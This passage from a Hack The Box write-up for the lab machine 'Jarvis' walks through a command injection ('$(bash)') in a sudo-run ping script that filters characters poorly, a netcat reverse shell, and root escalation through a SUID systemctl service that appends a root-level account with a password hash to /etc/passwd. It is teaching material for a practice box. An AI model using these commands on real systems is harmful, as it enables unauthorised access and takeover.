class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'--help'</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-s'</span>:</span><br><span class="line">        show_statistics()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-l'</span>:</span><br><span class="line">        list_ip()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-p'</span>:</span><br><span class="line">        exec_ping()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">www-data@jarvis:/home/pepper$</span><br></pre></td></tr></table></figure><p>The most interesting function in this script is <code>exec_ping</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure><p>It takes our input (it assumes that it’s an ip) and executes <code>ping</code> on it, to prevent command injection it checks for these characters:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ; - &#96; || |</span><br></pre></td></tr></table></figure><p>However, It doesn’t check for the dollar sign (<code>$</code>), the dollar sign can be used to execute commands like this: <code>$(command)</code><br>So for example if we do <code>ping -c 1 $(echo 127.0.0.1)</code>, <code>echo 127.0.0.1</code> will be executed first then the <code>ping</code> command will be executed:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# ping -c 1 $(echo 127.0.0.1)</span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.072 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.072&#x2F;0.072&#x2F;0.072&#x2F;0.000 ms</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure><p><code>ping -c 1 $(whoami)</code> will result in an error message because it will try to ping <code>root</code> which is not a valid hostname:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#  ping -c 1 $(whoami)</span><br><span class="line">ping: unknown host root</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure><p>So we can simply do <code>$(bash)</code> and we’ll get a shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _                       </span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span><br><span class="line">&#x2F; __| | &#39;_ &#96; _ \| &#39;_ \| |&#x2F; _ \ &#39;__| &#39;_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __&#x2F; |_ | |_) | |_| |</span><br><span class="line">|___&#x2F;_|_| |_| |_| .__&#x2F;|_|\___|_(_)| .__&#x2F; \__, |</span><br><span class="line">                |_|               |_|    |___&#x2F; </span><br><span class="line">                                @ironhackers.es</span><br><span class="line">                                </span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(bash)</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure><p>When I ran commands I didn’t get any output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:~$ id</span><br><span class="line">pepper@jarvis:~$ cat user.txt </span><br><span class="line">pepper@jarvis:~$ ls -la</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure><p>So I executed a reverse shell command (I used the same payload I used before) and got a reverse shell as <code>pepper</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1338</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1338</span><br><span class="line">Ncat: Listening on 0.0.0.0:1338</span><br><span class="line">Ncat: Connection from 10.10.10.143.</span><br><span class="line">Ncat: Connection from 10.10.10.143:40124.</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">pepper@jarvis:~$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1338</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1338</span><br><span class="line"></span><br><span class="line">pepper@jarvis:~$ export TERM&#x3D;screen</span><br><span class="line">pepper@jarvis:~$ id</span><br><span class="line">uid&#x3D;1000(pepper) gid&#x3D;1000(pepper) groups&#x3D;1000(pepper)</span><br><span class="line">pepper@jarvis:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..</span><br><span class="line">lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc</span><br><span class="line">drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile</span><br><span class="line">drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web</span><br><span class="line">-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/jarvis/17.png" alt=""></p><p>We owned user.</p><h2 id="Systemctl-suid-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#Systemctl-suid-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="Systemctl: suid –&gt; Root Shell –&gt; Root Flag"></a>Systemctl: suid –&gt; Root Shell –&gt; Root Flag</h2><p>When I checked the <code>suid</code> binaries I saw <code>systemctl</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:~$ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null </span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;systemctl</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure><blockquote><p>systemctl may be used to introspect and control the state of the “systemd” system and service manager. -<a href="http://man7.org/linux/man-pages/man1/systemctl.1.html" target="_blank" rel="noopener">man7.org</a></p></blockquote><p>To verify that it can be abused I checked <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins</a> and found a <a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">page</a> for it.<br>We need to create a service that executes a file of our choice when it starts, then we’ll use <code>systemctl</code> to enable and start it and the file will get executed as root.<br>I created a service that executes <code>/dev/shm/root.sh</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;pwned</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;dev&#x2F;shm&#x2F;root.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p>And I created <code>/dev/shm/root.sh</code> which echoes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>to <code>/etc/passwd</code> to enable us to <code>su</code> as root with the credentials <code>rooot : AAAA</code>. (Check <a href="/hack-the-box/ghoul/">Ghoul</a>).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ nano root.service</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat root.service</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;pwned</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;dev&#x2F;shm&#x2F;root.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ nano root.sh</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ chmod +x root.sh</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat root.sh</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &#39;rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p>I enabled the service and started it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ systemctl enable &#x2F;dev&#x2F;shm&#x2F;root.service</span><br><span class="line">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;root.service -&gt; &#x2F;dev&#x2F;shm&#x2F;root.service.</span><br><span class="line">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;root.service -&gt; &#x2F;dev&#x2F;shm&#x2F;root.service.</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ systemctl start root.service</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p>Now if we check <code>/etc/passwd</code> we’ll see that it has been modified:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:104:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:105:110::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">pepper:x:1000:1000:,,,:&#x2F;home&#x2F;pepper:&#x2F;bin&#x2F;bash</span><br><span class="line">mysql:x:106:112:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:107:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ su rooot </span><br><span class="line">Password: </span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# whoami</span><br><span class="line">root</span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# cd &#x2F;root&#x2F;</span><br><span class="line">root@jarvis:~# ls -al</span><br><span class="line">total 52</span><br><span class="line">drwx------  6 root root 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 23 root root 4096 Mar  3  2019 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  3  2019 .cache</span><br><span class="line">-rwxr--r--  1 root root   42 Mar  4  2019 clean.sh</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  3  2019 .config</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  3  2019 .local</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .mysql_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .python_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-r--------  1 root root   33 Mar  5  2019 root.txt</span><br><span class="line">-rw-r--r--  1 root root   66 Mar  4  2019 .selected_editor</span><br><span class="line">-rwxr-xr-x  1 root root 5271 Mar  5  2019 sqli_defender.py</span><br><span class="line">root@jarvis:~#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/jarvis/18.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/haystack/">Hack The Box - Haystack</a><br>Next Hack The Box write-up : <a href="/hack-the-box/networked/">Hack The Box - Networked</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/jarvis/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
